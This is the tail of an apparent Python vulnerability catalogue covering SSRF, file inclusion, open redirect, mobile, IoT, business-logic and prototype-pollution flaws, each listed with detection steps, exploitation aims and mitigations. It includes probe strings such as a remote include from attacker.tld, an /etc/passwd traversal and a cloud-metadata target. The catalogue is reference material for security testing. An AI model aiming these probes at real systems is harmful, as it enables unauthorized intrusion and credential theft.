        "mitigation": "Use RE2 or safe-regex, bound input length, add timeouts.",
        "references": ["CWE-1333"],
    },

    # ============================================================
    # 12. OTHER WEB
    # ============================================================
    {
        "id": "ssrf",
        "name": "Server-Side Request Forgery",
        "category": "SSRF",
        "severity": "Critical",
        "description": (
            "Server fetches a URL supplied by the user. Attacker pivots "
            "into internal services, cloud metadata, or Docker sockets."
        ),
        "detection": [
            "Submit http://169.254.169.254/ in every URL field",
            "Use decimal and IPv6 encodings of localhost",
            "Test DNS rebinding via nip.io",
            "Test file:// and gopher:// schemes",
        ],
        "exploitation": [
            "Steal IAM credentials from IMDS",
            "Hijack Redis via gopher for RCE",
            "Reach kube-apiserver from a pod",
        ],
        "payloads": ["ssrf-decimal", "ssrf-ipv6", "ssrf-gopher-redis", "ssrf-k8s-api"],
        "mitigation": "URL allowlist, disable file://, block 169.254.169.254.",
        "references": ["OWASP SSRF", "CWE-918"],
    },
    {
        "id": "ssrf-blind",
        "name": "Blind / Time-Based SSRF",
        "category": "SSRF",
        "severity": "High",
        "description": (
            "No response reflected. Attacker confirms SSRF via out-of-band "
            "DNS / HTTP callbacks or response time difference."
        ),
        "detection": [
            "Point URL field at a Burp Collaborator domain",
            "Measure delay for internal vs external URLs",
        ],
        "exploitation": [
            "Confirm SSRF via callback",
            "Port-scan internal services via time delay",
        ],
        "payloads": ["ssrf-oob"],
        "mitigation": "Block outbound traffic from app server, allowlist only.",
        "references": ["OWASP SSRF"],
    },
    {
        "id": "hpp",
        "name": "HTTP Parameter Pollution",
        "category": "Other Web",
        "severity": "Medium",
        "description": (
            "Duplicate query/body parameters are handled differently by WAF "
            "and backend, letting attacker bypass filters or corrupt state."
        ),
        "detection": [
            "Send ?id=1&id=2 and observe backend choice",
            "Test array vs scalar coercion",
        ],
        "exploitation": [
            "Bypass WAF filter with a clean duplicate",
            "Tamper with price or quantity",
        ],
        "payloads": ["hpp-bypass"],
        "mitigation": "Reject duplicate parameters, normalise on backend.",
        "references": ["OWASP HPP"],
    },
    {
        "id": "open-redirect",
        "name": "Open Redirect",
        "category": "Other Web",
        "severity": "Medium",
        "description": (
            "Server redirects to a user-supplied URL without validation. "
            "Used to steal OAuth codes or bypass URL allowlists."
        ),
        "detection": [
            "Submit https://attacker.tld as ?next= value",
            "Test //attacker.tld, /\\attacker.tld, and encoded forms",
        ],
        "exploitation": [
            "Steal OAuth code during login flow",
            "Phishing via trusted domain",
        ],
        "payloads": ["open-redirect-bypass"],
        "mitigation": "Allowlist redirect targets, use relative paths only.",
        "references": ["CWE-601"],
    },
    {
        "id": "lfi",
        "name": "Local File Inclusion",
        "category": "Other Web",
        "severity": "High",
        "description": (
            "Page parameter feeds a file path (include, require). Attacker "
            "reads arbitrary files or achieves RCE via log poisoning."
        ),
        "detection": [
            "Submit ../../../../etc/passwd",
            "Test PHP wrappers: php://filter, phar://",
            "Poison Apache logs with PHP code then include the log",
        ],
        "exploitation": [
            "Read /etc/passwd, .env, config files",
            "RCE via log poisoning + LFI",
            "Chain with /proc/self/environ",
        ],
        "payloads": ["lfi-traversal", "lfi-php-filter", "lfi-log-poison"],
        "mitigation": "Allowlist paths, chroot, disable dangerous wrappers.",
        "references": ["CWE-98"],
    },
    {
        "id": "rfi",
        "name": "Remote File Inclusion",
        "category": "Other Web",
        "severity": "Critical",
        "description": (
            "Application includes a remote URL. Attacker hosts a malicious "
            "PHP file and gets full RCE."
        ),
        "detection": [
            "Test ?page=http://attacker.tld/shell.txt",
            "Check allow_url_include in PHP",
        ],
        "exploitation": [
            "Host shell.php on attacker server, include via RFI",
            "Chain with XSS for delivery",
        ],
        "payloads": ["rfi-basic"],
        "mitigation": "Disable allow_url_include, allowlist includes.",
        "references": ["CWE-98"],
    },

    # ============================================================
    # 13. MOBILE
    # ============================================================
    {
        "id": "mobile-insecure-storage",
        "name": "Insecure Data Storage on Mobile",
        "category": "Mobile",
        "severity": "High",
        "description": (
            "App stores secrets in plaintext in SharedPreferences, "
            "NSUserDefaults, or SQLite. Extractable from backups or a "
            "rooted device."
        ),
        "detection": [
            "adb backup and unpack",
            "Check /data/data/<pkg>/shared_prefs/",
        ],
        "exploitation": [
            "Extract API tokens and session cookies",
            "Replay tokens against backend",
        ],
        "payloads": ["mobile-adb-backup"],
        "mitigation": "Use Keystore/Keychain, encrypt at rest.",
        "references": ["OWASP MASVS-STORAGE"],
    },
    {
        "id": "mobile-api-exposure",
        "name": "Insecure Mobile API Endpoints",
        "category": "Mobile",
        "severity": "High",
        "description": (
            "Mobile app talks to APIs that trust the client for auth or "
            "business logic. Decompile to recover endpoints and secrets."
        ),
        "detection": [
            "jadx / Ghidra decompile the APK",
            "Bypass SSL pinning with Frida",
            "Capture traffic via mitmproxy",
        ],
        "exploitation": [
            "Enumerate hidden endpoints",
            "Extract hardcoded API keys",
            "Reverse a signature scheme",
        ],
        "payloads": ["mobile-jadx", "mobile-frida-ssl"],
        "mitigation": "Server-side validation only, rotate keys, certificate pinning.",
        "references": ["OWASP MASVS-NETWORK"],
    },

    # ============================================================
    # 14. IOT
    # ============================================================
    {
        "id": "iot-default-creds",
        "name": "Weak IoT Authentication",
        "category": "IoT",
        "severity": "Critical",
        "description": (
            "Devices ship with fixed or predictable credentials and cannot "
            "be changed. Common on cameras, routers, and smart-home hubs."
        ),
        "detection": [
            "Test vendor defaults from public lists",
            "Test admin/admin, root/root, support/support",
        ],
        "exploitation": [
            "Log in as admin, upload firmware",
            "Extract device config with keys",
        ],
        "payloads": ["default-creds-list"],
        "mitigation": "Force unique password on first boot.",
        "references": ["OWASP IoT Top 10"],
    },
    {
        "id": "iot-firmware",
        "name": "Insecure Firmware / Update",
        "category": "IoT",
        "severity": "High",
        "description": (
            "Firmware updates not signed or fetched over HTTP. Attacker "
            "MITM the update to push a malicious image."
        ),
        "detection": [
            "Extract firmware with binwalk and inspect for HTTP endpoints",
            "Fingerprint update protocol (HTTP vs HTTPS, signature checks)",
        ],
        "exploitation": [
            "MITM update, push custom firmware",
            "Extract hardcoded keys from firmware",
        ],
        "payloads": ["iot-binwalk"],
        "mitigation": "Signed firmware, TLS with pinning, secure boot.",
        "references": ["OWASP IoT Top 10"],
    },

    # ============================================================
    # 15. BUSINESS LOGIC
    # ============================================================
    {
        "id": "price-manipulation",
        "name": "Price Manipulation",
        "category": "Business Logic",
        "severity": "High",
        "description": (
            "Client sends the price or quantity, and the server trusts it. "
            "Attacker buys at arbitrary price or negative quantity."
        ),
        "detection": [
            "Intercept checkout and change price to 0.01",
            "Test negative quantity for refund abuse",
        ],
        "exploitation": [
            "Buy items at $0.01",
            "Abuse refund logic for free goods",
        ],
        "payloads": ["logic-price-tamper"],
        "mitigation": "Compute price server-side from product id.",
        "references": ["OWASP Business Logic"],
    },
    {
        "id": "race-condition",
        "name": "Race Condition / TOCTOU",
        "category": "Business Logic",
        "severity": "High",
        "description": (
            "Two requests race on a shared resource (coupon, balance, "
            "reset token). Attacker triggers the bug via HTTP/2 single-"
            "packet attack."
        ),
        "detection": [
            "Send two parallel requests to the same state-changing endpoint",
            "Use Turbo Intruder single-packet attack for precision",
        ],
        "exploitation": [
            "Redeem coupon multiple times",
            "Reset password to attacker-chosen value",
            "Bypass withdrawal limit",
        ],
        "payloads": ["race-turbo-intruder", "race-single-packet"],
        "mitigation": "Database-level locking, idempotency keys, atomic operations.",
        "references": ["PortSwigger Race Conditions"],
    },
    {
        "id": "account-enum",
        "name": "Account Enumeration",
        "category": "Business Logic",
        "severity": "Low",
        "description": (
            "Login and reset endpoints reveal whether an account exists via "
            "response text, size, or timing."
        ),
        "detection": [
            "Send /login with valid vs invalid user and compare",
            "Measure timing difference between existing vs missing accounts",
        ],
        "exploitation": [
            "Enumerate all users for phishing or spraying",
        ],
        "payloads": ["enum-user-probe"],
        "mitigation": "Uniform response and timing regardless of user existence.",
        "references": ["OWASP Authentication"],
    },

    # ============================================================
    # 16. CONTENT SPOOFING
    # ============================================================
    {
        "id": "csp-bypass",
        "name": "Content Security Policy Bypass",
        "category": "Content Spoofing",
        "severity": "High",
        "description": (
            "CSP is present but allows unsafe-inline, JSONP endpoints, or "
            "an unsafe CDN. Attacker executes script despite CSP."
        ),
        "detection": [
            "Inspect CSP header for unsafe-inline or wildcards",
            "Enumerate JSONP endpoints on allowlisted hosts",
            "Test base-uri and frame-ancestors",
        ],
        "exploitation": [
            "Load JSONP on a trusted host to execute JS",
            "Chain with XSS sink to execute despite CSP",
        ],
        "payloads": ["xss-csp-bypass"],
        "mitigation": "CSP with nonce, no unsafe-inline, no wildcards.",
        "references": ["CSP Bypass research"],
    },
    {
        "id": "mime-sniffing",
        "name": "MIME Sniffing",
        "category": "Content Spoofing",
        "severity": "Medium",
        "description": (
            "Browser sniffs content type instead of trusting the declared "
            "one. Attacker uploads HTML masquerading as an image and gets "
            "script execution."
        ),
        "detection": [
            "Upload an HTML file with image content-type",
            "Check for X-Content-Type-Options: nosniff",
        ],
        "exploitation": [
            "Upload shell.html as image/png",
            "Chain with XSS to execute",
        ],
        "payloads": ["mime-upload-html"],
        "mitigation": "X-Content-Type-Options: nosniff on every response.",
        "references": ["CWE-430"],
    },

    # ============================================================
    # 17. ZERO-DAY CLASS
    # ============================================================
    {
        "id": "zero-day-patterns",
        "name": "Zero-Day Attack Patterns",
        "category": "Zero-Day",
        "severity": "Critical",
        "description": (
            "No public CVE yet. Attacker chains known primitives (parser "
            "differential, integer overflow, prototype pollution gadget) "
            "into an unintended behaviour. The reasoning framework matters "
            "more than any single payload."
        ),
        "detection": [
            "Fuzz parsers and type coercion edges",
            "Differential analysis: browser vs server, one proxy vs another",
            "Static analysis of recently-changed code",
            "Behavioural diff between library versions",
        ],
        "exploitation": [
            "Assemble primitives into a working chain",
            "Bypass mitigations layer by layer",
            "Test on the exact target version, not latest",
        ],
        "payloads": [],
        "mitigation": "Patch fast, run bug bounty, use sandboxed parsers.",
        "references": ["Google Project Zero", "Pwn2Own writeups"],
    },
    {
        "id": "prototype-pollution",
        "name": "Prototype Pollution",
        "category": "Zero-Day",
        "severity": "High",
        "description": (
            "Attacker merges __proto__ or constructor.prototype into user-"
            "controlled objects, altering Object.prototype behaviour. "
            "Chain with gadget in libraries for RCE."
        ),
        "detection": [
            "Send {\"__proto__\":{\"test\":\"apex\"}} to merge endpoints",
            "Check for vulnerable merge/lodash functions",
        ],
        "exploitation": [
            "Pollute Object.prototype to bypass auth checks",
            "Chain with EJS / Handlebars gadgets for RCE",
        ],
        "payloads": ["proto-pollution-merge", "proto-pollution-ejs"],
        "mitigation": "Freeze Object.prototype, use Object.create(null), patch libraries.",
        "references": ["CWE-1321", "PortSwigger Prototype Pollution"],
    },
]


def all_vulnerabilities() -> List[Dict[str, Any]]:
    return list(VULNERABILITIES)


def by_category() -> Dict[str, List[Dict[str, Any]]]:
    out: Dict[str, List[Dict[str, Any]]] = {}
    for v in VULNERABILITIES:
        out.setdefault(v["category"], []).append(v)
    return out


def get(vuln_id: str) -> Optional[Dict[str, Any]]:
    for v in VULNERABILITIES:
        if v["id"] == vuln_id:
            return v
    return None


def search(keyword: str) -> List[Dict[str, Any]]:
    kw = (keyword or "").strip().lower()
    if not kw:
        return []
    tokens = kw.split()
    hits: List[Dict[str, Any]] = []
    for v in VULNERABILITIES:
        blob = " ".join([
            v.get("id", ""), v.get("name", ""), v.get("category", ""),
            v.get("description", ""), v.get("mitigation", ""),
            " ".join(v.get("detection", [])),
            " ".join(v.get("exploitation", [])),
        ]).lower()
        if all(t in blob for t in tokens):
            hits.append(v)
    return hits


def categories() -> List[str]:
    return sorted({v["category"] for v in VULNERABILITIES})


def total() -> int:
    return len(VULNERABILITIES)
